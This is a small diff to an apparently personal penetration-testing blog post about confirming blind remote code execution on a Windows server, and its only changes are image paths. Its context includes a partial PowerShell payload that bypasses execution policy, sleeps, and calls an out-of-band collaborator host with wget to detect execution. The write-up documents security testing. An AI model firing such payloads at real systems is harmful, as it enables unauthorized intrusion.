@@ -5,7 +5,7 @@ I was following the PoC given [here](http://www.0xby.com/1589.html).
 
 I was getting the following page while accessing the application.
 
-![image1]({{ site.url }}{{ site.baseurl }}/assets/images/dns/1.1.png){: .align-center}
+![image1](1.1.png){: .align-center}
 image 1.1
 
 There were RCE available payloads for windows and linux. The following payload was used to trigger the RCE for windows.
@@ -52,7 +52,7 @@ powershell -exec bypass -c "sleep 60;wget 'kuiudtisadndwxklxi7g9c6rwi28qx.burpco
 
 And I did get a hit exactly after 65 seconds, which confirms that the system is running on windows and we indeed have blind RCE.
 
-![image1]({{ site.url }}{{ site.baseurl }}/assets/images/dns/1.2.png){: .align-center}
+![image1](1.2.png){: .align-center}
 image 1.2
 
 Looking at the above picture, we can see that something is trying to resolve our request, but the actual request is getting blocked. There was also one more thing I noticed. If I try the same url again, I would not get a DNS hit as the DNS request is probably getting cached.
